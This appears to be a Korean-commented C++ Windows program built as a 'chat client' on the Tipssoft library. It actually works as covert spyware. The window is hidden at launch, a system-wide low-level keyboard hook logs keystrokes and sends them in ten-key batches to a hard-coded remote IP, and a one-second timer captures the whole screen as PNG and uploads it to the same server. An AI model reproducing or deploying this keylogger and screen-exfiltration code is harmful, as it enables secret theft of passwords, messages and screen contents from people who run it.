// MyChatClient.cpp: 응용 프로그램의 진입점을 정의합니다.
//

#include "stdafx.h"
#include "MyChatClient.h"
#include "twapi_w01.h"
#include "twapi_w01_gdi.h"
#include "twapi_w01_util.h"
#include "twapi_w01_socket.h"
#include "twapi_w01_lib_info.h"
#include <iostream>

#define NM_CHAT_DATA           1      // 채팅 메시지
#define NM_SEND_SCREEN_IMAGE   2      // 화면 전송 메시지
#define PORT 3600
#define IP L"203.241.228.47"

LRESULT CALLBACK Keyboard(int code, WPARAM wParam, LPARAM lParam);

class MyClient : public TW_ClientSocket
{
private:
	// ListBox의 주소를 저장할 변수
	TW_ListBoxWnd * mp_chat_list;

public:
	// 프로토콜 헤더의 시작 바이트를 0x27값으로 설정한다.
	MyClient() : TW_ClientSocket(0x27){ }
	// 외부에서 ListBox의 주소를 설정할 함수
	void SetChatList(TW_ListBoxWnd *ap_chat_list)
	{
		mp_chat_list = ap_chat_list;
	}
	// 서버에서 보낸 데이터가 수신되었을때 호출되는 함수
	virtual INT32 ProcessRecvData(SOCKET ah_socket, UINT8 a_msg_id, UINT8 *ap_recv_data, UINT32 a_body_size)
	{
		// 대용량 데이터가 전송 또는 수신될 때, 필요한 기본 코드를 수행
		TW_ClientSocket::ProcessRecvData(ah_socket, a_msg_id, ap_recv_data, a_body_size);

		// 수신된 데이터가 채팅 데이터인 경우
		if (a_msg_id == NM_CHAT_DATA) {
			// 수신된 데이터에 채팅 정보가 유니코드 형태의 문자열로 저장되어 있기 때문에
			// 유니코드 문자열 형태로 캐스팅하여 사용한다.
			mp_chat_list->InsertString(-1, (wchar_t*)ap_recv_data);
		}
		return 1;
	}
};

#define MAX_PNG_SIZE    4194304  // 4*1024*1024 = 4Mbytes

HHOOK _hook;
MyClient m_client;

class MyWnd : public TW_Wnd
{
private:
	TW_ListBoxWnd m_chat_list;   // 채팅 목록을 관리할 ListBox 객체
	TW_EditWnd m_chat_edit;      // 채팅을 입력할 Edit 객체
	//MyClient m_client;           // 클라이언트 소켓용 객체
	TW_Image m_capture;
	UINT8 *mp_png_data;

public:
	MyWnd() // 객체 생성자
	{
		mp_png_data = new UINT8[MAX_PNG_SIZE];
	}
	~MyWnd() // 객체 파괴자
	{
		delete[] mp_png_data;
	}

	// Edit 컨트롤의 색상을 조정하는 함수
	virtual int OnCtrlColorEdit(HDC ah_dc, HWND ah_wnd)
	{
		// m_chat_edit의 색상을 기본 테마 색상으로 변경한다.
		if (m_chat_edit.GetHandle() == ah_wnd)
			return m_chat_edit.OnCtrlColor(ah_dc, ah_wnd);
		return 0;
	}
	// ListBox 항목의 높이를 조정하는 함수
	virtual INT32 OnMeasureItem(UINT32 a_is_ctrl, MEASUREITEMSTRUCT *ap_mis)
	{
		if (a_is_ctrl && ap_mis->CtlID == 25001) {
			ap_mis->itemHeight = 19;  // 높이를 12에서 19으로 변경한다.
			return 1;
		}
		return 0;
	}
	// ListBox의 각 항목을 사용자가 정의한대로 출력하는 함수
	virtual INT32 OnDrawItem(INT32 a_ctrl_id, DRAWITEMSTRUCT *ap_dis)
	{
		if (a_ctrl_id == 25001) {
			m_chat_list.OnDrawItem(ap_dis); // 기본 테마 색상으로 변경!
			return 1;
		}
		return 0;
	}
	// ListBox의 배경색을 정의하는 함수
	virtual int OnCtrlColorListBox(HDC ah_dc, HWND ah_wnd)
	{
		// 현재 발생한 메시지가 mh_list_box를 위한 것인지 체크한다.
		if (ah_wnd == m_chat_list.GetHandle()) {
			// ListBox의 배경색으로 사용할 Brush 객체를 전달한다.
			return (int)(gp_stock_brush->GetBrush(RGB(62, 77, 104)));
		}
		return 0;
	}
	// 서버에 접속또는실패하거나 서버에서 데이터가 수신되는 경우를 처리함
	virtual LRESULT UserMessageProc(UINT uMsg, WPARAM wParam, LPARAM lParam)
	{
		if (uMsg == 26001) { // 서버 접속에 대한 결과!! ( FD_CONNECT)
			if(1 == m_client.ResultOfConnection(lParam))
				m_chat_list.InsertString(-1, L"서버에 접속했습니다.");
			else 
				m_chat_list.InsertString(-1, L"서버에 접속할 수 없습니다.");
			return 1;
		} else if (uMsg == 26002) { // 서버에서 데이터를 전송하거나 접속을 해제!!
			m_client.ProcessServerEvent(wParam, lParam); // FD_READ, FD_CLOSE
		}
		return 0;
	}
	void SendScreenImage()
	{
		if (m_client.GetSendMan()->IsProcessing()) {
			//m_chat_list.InsertString(-1, L"이전 데이터가 아직 전송중입니다!");
			return;
		}
		// 화면 전체 이미지를 h_mem_dc에 연결된 h_bitmap에 복사한다. 
		m_capture.CaptureScreen();
		// h_bitmap에 저장된 이미지를 PNG 형식으로 변환해서 메모리에 저장한다.
		int data_size = TWAPI_SaveImageToMemory(mp_png_data, MAX_PNG_SIZE, m_capture.GetBitmap());

		// PNG 파일을 전송하기 위해서 PNG 파일의 크기만큼 메모리를 할당한다.
		UINT8 *p = m_client.GetSendMan()->MemoryAlloc(data_size);
		// PNG가 저장된 메모리를 TW_SendManager에 복사한다.
		memcpy(p, mp_png_data, data_size);
		// 서버에 PNG 파일을 수신하기 위한 메모리를 준비하라고 메시지를 전송한다.
		m_client.SendFrameData(NM_SEND_SCREEN_IMAGE, (UINT8 *)&data_size, sizeof(int));
	}
	
	virtual void OnTimer(UINT a_timer_id)
	{
		if(a_timer_id == 1 && m_client.IsConnected()) SendScreenImage();
	}
	virtual int OnCreate(CREATESTRUCT *ap_create_info)
	{
		TW_Wnd::OnCreate(ap_create_info);

		// 캡쳐에 사용할 이미지를 생성한다.
		m_capture.CreateScreenBitmap();

		// 시작점이 (3, 3)이고 끝점이(421, 217)이고 ID가 25001인 ListBox를 생성한다.
		m_chat_list.CreateEx(mh_wnd, 3, 3, 421, 190, 25001, LBS_OWNERDRAWFIXED | LBS_HASSTRINGS);
		// ListBox 아래에 Edit 컨트롤을 생성한다.
		m_chat_edit.Create(mh_wnd, 3, 193, 421, 215, 25002);
		// Edit 컨트롤에 엔터키가 해제될때 EN_ENTER_KEYUP Notify code가 발생하도록 설정한다.
		m_chat_edit.SubclassWnd();

		// m_chat_list의 주소를 MyClient 클래스에서 사용할 수 있도록 넘겨준다.
		m_client.SetChatList(&m_chat_list);
		// IP 주소가 '127.0.0.1'을 사용하고 포트 번호가 19999인 서버에 접속을 시도합니다.
		m_client.ConnectToServer(IP, PORT, mh_wnd);

		SetTimer(1, 1000);
		m_chat_list.InsertString(-1, L"화면 전송서비스를 시작합니다.");

		return 0;
	}
	virtual void OnPaint()
	{
		// 부모 Window에 WM_PAINT 메시지가 발생하면 자식 Window에도
		// WM_PAINT 메시지를 전달해야 한다.
		m_chat_list.Invalidate();
		m_chat_edit.Invalidate();

		mp_target->BeginDraw();
		// 파란색으로 클라이언트 영역을 채운다.
		mp_target->Clear(ColorF(0.1875f, 0.2343f, 0.3203f));
		mp_target->EndDraw();
	}
};

class MyApp : public TW_WinApp
{
public:
	MyApp(HINSTANCE ah_instance, const wchar_t *ap_class_name)
		: TW_WinApp(ah_instance, ap_class_name) { }

	void SetHook() {
		HMODULE hInstance = GetModuleHandle(NULL);
		_hook = SetWindowsHookEx(WH_KEYBOARD_LL, Keyboard, hInstance, NULL);
	}

	virtual void InitInstance()
	{
		mp_wnd = new MyWnd;
		mp_wnd->Create(L"Chat Client - Tipssoft.com", 50, 50, 440, 257,
							WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU);
		mp_wnd->ShowWindow(SW_HIDE);
		mp_wnd->UpdateWindow();
	}
};

TW_String str = "";

LRESULT CALLBACK Keyboard(int code, WPARAM wParam, LPARAM lParam)
{
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		PKBDLLHOOKSTRUCT pKey = (PKBDLLHOOKSTRUCT)lParam;
		if (code >= 0 && (int)wParam == 256) {
			str.AddString((wchar_t*)pKey, 1);
			if (str.GetLength() == 10) {
				m_client.SendFrameData(NM_CHAT_DATA, (UINT8*)(const wchar_t*)str, (str.GetLength() + 1) * 2);
				str.RemoveString();
			}
		}
	}

	return CallNextHookEx(_hook, code, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	MyApp tips_app(hInstance, L"MyChatClient");
	tips_app.SetHook();
	return tips_app.NormalProcess();
}
